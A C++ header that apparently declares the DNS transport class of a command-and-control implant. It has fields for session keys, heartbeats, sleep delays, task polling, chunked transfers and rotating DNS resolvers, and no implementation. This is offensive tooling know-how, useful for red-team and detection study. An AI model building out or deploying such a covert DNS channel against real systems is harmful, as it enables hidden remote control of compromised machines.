#pragma once

#include "AgentConfig.h"
#include <windows.h>

class ConnectorDNS
{
private:
    ProfileDNS profile = { 0 };

    CHAR  rawResolvers[512] = { 0 };
    CHAR* resolverList[16] = { 0 };
    ULONG resolverCount = 0;
    ULONG currentResolverIndex = 0;
    ULONG resolverFailCount[16] = { 0 };
    ULONG resolverDisabledUntil[16] = { 0 };

    CHAR  sid[17] = { 0 };
    BYTE  encryptKey[16] = { 0 };
    ULONG pktSize = 0;
    ULONG labelSize = 0;
    CHAR  domain[256] = { 0 };
    CHAR  qtype[8] = { 0 };
    BOOL  initialized = FALSE;
    BOOL  hiSent = FALSE;
    BYTE* hiBeat = NULL;
    ULONG hiBeatSize = 0;
    ULONG hiRetries = 3;
    ULONG seq = 0;
    ULONG idx = 0;

    BYTE* recvData = NULL;
    int   recvSize = 0;

    BYTE* downBuf    = NULL;
    ULONG downTotal  = 0;
    ULONG downFilled = 0;
    ULONG downAckOffset = 0;
    ULONG downTaskNonce = 0;

    BOOL  compressEnabled = TRUE;
    ULONG lastDownTotal   = 0;
    ULONG lastUpTotal     = 0;

    BOOL  lastQueryOk     = FALSE;

    ULONG sleepDelaySeconds = 0;

public:
    ConnectorDNS();

    BOOL SetConfig(ProfileDNS profile, BYTE* beat, ULONG beatSize, ULONG sleepDelaySeconds);
    void CloseConnector();

    void  SendData(BYTE* data, ULONG data_size);
    BYTE* RecvData();
    int   RecvSize();
    void  RecvClear();

    ULONG GetLastUpTotal() const { return lastUpTotal; }
    ULONG GetLastDownTotal() const { return lastDownTotal; }
    void  ResetTrafficTotals() { lastUpTotal = 0; lastDownTotal = 0; }
    
    BOOL  WasLastQueryOk() const { return lastQueryOk; }

    const BYTE* GetResolvers() const { return profile.resolvers; }
    void        UpdateResolvers(BYTE* resolvers);

    BOOL  IsBusy() const;
    ULONG GetDownAckOffset() const { return downAckOffset; }

    BOOL  QueryWithRotation(const CHAR* qname, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize);
    
private:
    BOOL  hasPendingTasks = FALSE;
	BOOL  forcePoll = FALSE;

public:
	void  ForcePollOnce() { this->forcePoll = TRUE; }
};
